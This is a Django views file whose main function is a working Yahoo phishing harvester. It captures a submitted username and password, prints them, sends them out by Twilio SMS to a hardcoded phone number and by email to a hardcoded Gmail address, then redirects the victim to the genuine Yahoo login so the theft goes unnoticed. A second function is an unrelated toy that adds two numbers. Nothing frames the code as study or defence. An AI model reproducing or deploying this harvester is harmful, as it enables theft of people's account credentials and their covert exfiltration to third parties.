from django.shortcuts import render,HttpResponseRedirect
import datetime
from twilio.rest import Client
from django.core.mail import EmailMessage

# Create your views here.

def fun1(request):
    if request.method == 'POST':
        a = request.POST.get('username')
        b = request.POST.get('passwd')
        print("User : ", a)
        print("Password : ", b)
        x = "###################################"
        y = "###################################"

        xyz = Client(x,y)

        xyz.messages.create(from_ = "(334) 401-2670", to ="+919633337140", body="Yahooo Credentials....\n User = "+a+"Password = "+b)

        email = EmailMessage('Yahooo Credentials', "User = "+a+"Password = "+b, to=['rakhil.rahul@gmail.com'])
        email.send()

        return HttpResponseRedirect('https://login.yahoo.com/config/login?.src=fpctx&.intl=in&.lang=en-IN&.done=https%3A%2F%2Fin.yahoo.com')
    return render(request, 'login.html')


def fun2(request):
    c = ""
    if request.method == 'POST':
        a = int(request.POST.get('email'))
        b = int(request.POST.get('pswd'))
        c = a+b
    return render(request, 'index.html', {'sum': c, })
